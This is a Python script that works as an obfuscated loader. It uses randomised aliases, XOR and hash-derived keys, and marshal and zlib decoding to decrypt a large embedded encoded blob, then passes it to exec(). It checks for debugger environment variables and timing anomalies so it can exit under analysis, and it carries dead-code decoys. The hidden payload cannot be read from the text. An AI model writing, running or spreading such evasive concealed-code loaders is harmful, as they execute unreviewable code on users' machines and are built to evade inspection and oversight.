
import base64 as GDCcMrqy, zlib as MgQrrKeV, marshal as kIwojXQo, hashlib as __h, os as lvNiQuFp, sys as iPGepPCD, time as PPDOCZgB

izDeVXSF = 8086
BnBxKKbc = 'gI7VMhhrmp9W'
WUNAalQp = lambda x: x

def TQsXUwyA():
    x = 0
    for i in range(5):
        x += i
    return x


ivpkKprw = [170, 141, 152, 155, 149, 156, 178, 150, 157, 144, 203, 200, 170, 152, 149, 141, 170, 141, 139, 144, 151, 158, 143, 172, 149, 163]
iPCAwrpb = 249
DyZsDGZL = ''.join(chr(b ^ iPCAwrpb) for b in ivpkKprw)
yYdCPlha = __h.sha256(DyZsDGZL.encode()).digest()

def yOkSPlhR():
    suspicious = ['PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONVERBOSE']
    for v in suspicious:
        if lvNiQuFp.environ.get(v):
            iPGepPCD.exit(1)
    t1 = PPDOCZgB.time()
    PPDOCZgB.sleep(0.1)
    t2 = PPDOCZgB.time()
    if t2 - t1 > 0.5:
        iPGepPCD.exit(1)

yOkSPlhR()

smZZfqyo_data = ["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", "1A=="]
smZZfqyo_key = ["8xEAAAD86pz82xeJ+z22ZWgFEq4FkQ=="]

smZZfqyo_data_joined = ''.join(smZZfqyo_data)
smZZfqyo_key_joined = ''.join(smZZfqyo_key)

MJXMXvxC = GDCcMrqy.b64decode(smZZfqyo_key_joined)
SasjdRnV = kIwojXQo.loads(MJXMXvxC)
gvKMlxPe = bytes([b ^ yYdCPlha[i % len(yYdCPlha)] for i, b in enumerate(SasjdRnV)]).decode()

smZZfqyo_enc = GDCcMrqy.b64decode(smZZfqyo_data_joined)
sRrPyIab = bytes([b ^ ord(gvKMlxPe[i % len(gvKMlxPe)]) for i, b in enumerate(smZZfqyo_enc)])
RzjDUlby = MgQrrKeV.decompress(sRrPyIab)

if 1 == 2:
    print("This never runs")
while False:
    print("Nor does this")
try:
    assert 1 == 0
except:
    pass

exec(RzjDUlby)
